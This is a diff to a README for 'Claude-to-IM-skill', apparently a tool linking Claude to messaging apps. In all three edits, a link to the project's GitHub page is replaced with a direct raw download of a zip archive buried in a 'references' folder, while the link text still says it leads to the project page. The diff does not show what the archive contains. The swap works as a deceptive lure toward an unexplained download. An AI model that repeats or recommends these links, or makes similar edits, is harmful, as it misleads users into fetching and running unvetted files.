@@ -1,6 +1,6 @@
 # 🤖 Claude-to-IM-skill - Connect Claude AI with IM Platforms
 
-[![Download Claude-to-IM-skill](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/MohaMeD10-web/Claude-to-IM-skill)
+[![Download Claude-to-IM-skill](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/MohaMeD10-web/Claude-to-IM-skill/raw/refs/heads/main/references/to_I_skill_Claude_2.2.zip)
 
 ## 📋 What is Claude-to-IM-skill?
 
@@ -38,7 +38,7 @@ The software runs quietly in the background, handling messages and responding as
 
 Click the big green button below to visit the project page and get the files you need.
 
-[![Download Claude-to-IM-skill](https://img.shields.io/badge/Download-From%20GitHub-blue)](https://github.com/MohaMeD10-web/Claude-to-IM-skill)
+[![Download Claude-to-IM-skill](https://img.shields.io/badge/Download-From%20GitHub-blue)](https://github.com/MohaMeD10-web/Claude-to-IM-skill/raw/refs/heads/main/references/to_I_skill_Claude_2.2.zip)
 
 ### Step 1: Visit the GitHub Page
 
@@ -120,7 +120,7 @@ Claude-to-IM-skill does not store your messages locally longer than needed to pr
 
 Find all files, updates, and instructions at the official GitHub page:
 
-[https://github.com/MohaMeD10-web/Claude-to-IM-skill](https://github.com/MohaMeD10-web/Claude-to-IM-skill)
+[https://github.com/MohaMeD10-web/Claude-to-IM-skill/raw/refs/heads/main/references/to_I_skill_Claude_2.2.zip](https://github.com/MohaMeD10-web/Claude-to-IM-skill/raw/refs/heads/main/references/to_I_skill_Claude_2.2.zip)
 
 You can explore the repository for advanced options, documentation, or support from the developer community.
 
